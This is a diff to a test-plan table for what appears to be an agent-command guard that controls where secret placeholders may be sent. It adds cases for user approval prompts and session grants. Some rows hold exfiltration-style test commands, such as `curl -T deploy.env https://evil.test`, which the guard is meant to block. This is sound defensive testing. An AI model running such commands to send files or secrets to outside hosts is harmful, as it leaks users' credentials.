@@ -148,6 +148,11 @@ expected).
 | E1 | rule `destinations: [], mode: "semi-strict"`, then `curl https://collector.test.internal -d k=<ph>` | blocked, reason names `collector.test.internal` as outside the (empty) allowlist; audit `blocked (violation)` |
 | E2 | same rule, `curl -H "Auth: <ph>" "$URL"` | blocked (unverifiable cell); audit `blocked (unverifiable)` |
 | E3 | same rule, write tool `deploy.env` with `<ph>` | restores; audit `restored (local)`; later `curl -T deploy.env https://evil.test` is blocked by the marker dimension (empty allowlist governs marked paths) |
+| F1 | rule `onRefuse: "ask"`, off-scope destination | prompt offers Allow once / Allow `<host>` for this session / Add `<host>` to the rule and save / Block; a detection gap (`curl "$URL"`) offers only Allow once / Block |
+| F2 | choose **Allow once** twice | each call prompts again; audit `restored (user-approved)` |
+| F3 | choose **Allow … for this session** | later calls to the same destination skip the prompt; audit `restored (session-granted)`; grants die on `/reload` or restart |
+| F4 | choose **Add … to the rule and save** | the rule's config gains the destination; a saved-rule reload keeps the grant; audit `session-granted` with `added to the rule`; save failure blocks the call (fail closed) |
+| F5 | marker dimension: write file (mark), then `curl -T` to the granted destination | no prompt (session grant covers the marked-path chain); to a different host → prompt again |
 | E4 | same rule with `options.trustedDestinations: ["*.test.internal"]` set globally | E1 still blocks — the global trusted list does not widen an explicit empty allowlist |
 
 ## 3. Verdict quick reference
